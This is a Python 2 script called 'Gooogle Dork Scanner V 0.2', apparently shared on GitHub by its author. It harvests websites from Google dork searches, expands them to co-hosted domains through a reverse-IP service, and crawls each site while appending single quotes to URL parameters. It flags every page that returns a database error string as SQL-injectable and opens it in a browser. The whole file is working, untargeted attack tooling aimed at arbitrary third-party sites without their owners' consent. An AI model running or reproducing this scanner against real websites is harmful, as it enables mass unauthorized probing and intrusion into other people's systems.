#-*- coding: cp1254 -*-
#!/usr/bin/python


import re
import urllib
import urllib2
import urlparse         
import mechanize
import webbrowser
import os
import random  
import colorama
colorama.init()
import threading

print """


Gooogle Dork Scanner V 0.2 

Concat : b3mb4m@gmail.com

https://github.com/b3mb4m

Video Link : http://www.youtube.com/watch?v=LzX7rt0hdrg

"""


print ""       
dork = raw_input("Dork : ")
print ""
appurls=[]#app urls

useragent = ['Mozilla/4.0 (compatible; MSIE 5.0; SunOS 5.10 sun4u; X11)',
            'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.2pre) Gecko/20100207 Ubuntu/9.04 (jaunty) Namoroka/3.6.2pre',
            'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Avant Browser;',
            'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)',
            'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)',
            'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.6)',
            'Microsoft Internet Explorer/4.0b1 (Windows 95)',
            'Opera/8.00 (Windows NT 5.1; U; en)',
            'Mozilla/4.0 (compatible; MSIE 5.0; AOL 4.0; Windows 95; c_athome)',
            'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)',
            'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.5 (like Gecko) (Kubuntu)',
            'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; ZoomSpider.net bot; .NET CLR 1.1.4322)',
            'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; QihooBot 1.0 qihoobot@qihoo.net)',
            'Mozilla/4.0 (compatible; MSIE 5.0; Windows ME) Opera 5.11 [en]']

agents = random.choice(useragent)

uagent= {'User-Agent':'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.6)'}

b3mb4m = []  

def collecturls():

  br = mechanize.Browser()
  br.set_handle_robots(False) 
  br.addheaders = [('User-agent', agents)]

    
  page = ["0"]#You can change if u want
            
  for i in page:
      try:
        google = "https://www.google.com/search?num=10&q="+dork+"&start="+i 
        htmltext = br.open(google).read()
        pattern = re.compile("<h3 class=\"r\"><a href=\"/url\?q=(.*?)&amp.*?\">.*?</a></h3>") # grep url
        found = re.findall(pattern,htmltext)
        #time.sleep(4)
        print "\n[+]URL Search "+i
        #time.sleep(5)
      except:
        pass
                
      for i in found:
        #url = urlparse(i).netloc
        url = urlparse.urlparse(i).netloc 
        if "google" in i:
          pass
        elif "youtube" in i:
          pass
        elif "vimeo" in i:
          pass
        elif "facebook" in i:
          pass
        elif "pastebin" in i:
          pass
        elif "zone-h" in i:
          pass
        elif "4shared" in i:
          pass
        elif "fulldownloadshare" in i:
          pass
        elif "rapidsharemix" in i:
          pass
        elif "ethicalhackx" in i:
          pass
        elif "systemanforderungen" in i:
          pass
        elif "gamesystemrequirements" in i:
          pass
        elif "gepigeny" in i:
          pass 
        else:
          appurls.append(url)


  for i in set(appurls):

    if i.startswith("http://"):
      i = i.replace("http://", "")
      print "\n\tI fixed link ", i

    elif i.startswith("https://"):
      i = i.replace("https://", "")
      print "\n\tI fixed link ", i

    else:
      i = i  
    #print i  

    urlqeqe = "http://viewdns.info/reverseip/?host=%s&t=1" % (i)

    req = urllib2.Request(urlqeqe, headers=uagent)
    fd = urllib2.urlopen(req)
    data = fd.read()
    baglantilar = re.findall("<tr><td>\S+</td><td", data)

    for i in baglantilar:
      i = i.replace("<tr><td>", "").replace("</td><td", "")
      #print i

      if i.startswith("http://"):
        pass
      else:
        i = "http://"+i 

      if "Domain" not in i:
        #print "\n\t"+i
        b3mb4m.append(i)
      else:
        pass


def sqltest():
        print " \n Targets Loading \n "
        for url in set(b3mb4m):
            print url
        for url in set(b3mb4m):
        #for url in sites:

            print "[+] Target "+url
         
            tarayici = mechanize.Browser()
            tarayici.set_handle_robots(False)
            tarayici.addheaders = [('User-agent', agents)]

            urls = [url]
            gez = [url]
            
            sayma = 0

            try: 
                while len(urls)>0:
                    try:   
                        tarayici.open(urls[0])
                        urls.pop(0)
                        try:
                            for link in tarayici.links():
                                yeniurl =  urlparse.urljoin(link.base_url,link.url)
                                if yeniurl not in gez and url in yeniurl:
                                    gez.append(yeniurl)
                                    urls.append(yeniurl)

                                    try:
                                        sayma = sayma+1
                                        if sayma == 100: 
                                            urls = 0
                                    except:
                                        break

                                    if "=" in yeniurl:
                                        yeniurl = yeniurl.replace("=", "='")
                                        print colorama.Fore.RED + "[+] Value Found " + yeniurl
                                    elif ".html" in yeniurl:
                                        yeniurl = yeniurl.replace(".html", "'.html")
                                        print colorama.Fore.MAGENTA + "[+] Value Found " + yeniurl
                                    else:
                                        yeniurl = yeniurl + "'"
                                        #print colorama.Fore.WHITE + "[-] No Value " + yeniurl    
                                            
                                    try:
                                        req  = urllib2.Request(yeniurl, headers=uagent)
                                        fd   = urllib2.urlopen(req)
                                        data = fd.read()

                                        if "Query failed" in data:
                                            print "-->  "+yeniurl
                                            webbrowser.open(yeniurl)
                                            urls = 0
                                                
                                        elif "supplied argument is not a valid MySQL result resource in" in data:
                                            print  "-->  "+yeniurl
                                            webbrowser.open(yeniurl)
                                            urls = 0
                                                 
                                        elif "You have an error in your SQL syntax" in data:
                                            print "-->  "+yeniurl
                                            webbrowser.open(yeniurl)
                                            urls = 0
                                                
                                        elif "ORDER BY" in data:
                                            print "-->  "+yeniurl
                                            webbrowser.open(yeniurl)
                                            urls = 0
                                                
                                        elif "mysql_num_rows()" in data:
                                            print "-->  "+yeniurl
                                            webbrowser.open(yeniurl)
                                            urls = 0
                                               
                                        elif "SQL query failed" in data:
                                            print "-->  "+yeniurl
                                            webbrowser.open(yeniurl)
                                            urls = 0
                                               
                                        elif "Microsoft JET Database Engine error '80040e14'" in data:
                                            print "-->  "+yeniurl
                                            webbrowser.open(yeniurl)
                                            urls = 0
                                                
                                        elif "Microsoft OLE DB Provider for Oracle" in data:
                                            print "-->  "+yeniurl
                                            webbrowser.open(yeniurl)
                                            urls = 0
                                                
                                        elif "Error:unknown" in data:
                                            print "-->  "+yeniurl
                                            webbrowser.open(yeniurl)
                                            urls = 0
                                               
                                        elif "Fatal error" in data:
                                            print "-->  "+yeniurl
                                            webbrowser.open(yeniurl)
                                            urls = 0
                                                
                                        elif "mysql_fetch" in data:
                                            print "-->  "+yeniurl
                                            webbrowser.open(yeniurl)
                                            urls = 0
                                                
                                        elif "Syntax error" in data:
                                            print "-->  "+yeniurl
                                            webbrowser.open(yeniurl)
                                            urls = 0
                                                
                                        elif "error in your SQL syntax" in data:
                                            print "-->  "+yeniurl
                                            webbrowser.open(yeniurl)
                                            urls = 0 
                                               
                                        else:
                                            pass      
                                    except:
                                        pass  
                        except:
                            break                     
                    except:
                        urls.pop(0)
            except:
                pass  
                     
                          



collecturls = threading.Thread(name='collecturls', target=collecturls)
sqltest = threading.Thread(name='sqltest', target=sqltest)

collecturls.run()
sqltest.run()

                                  
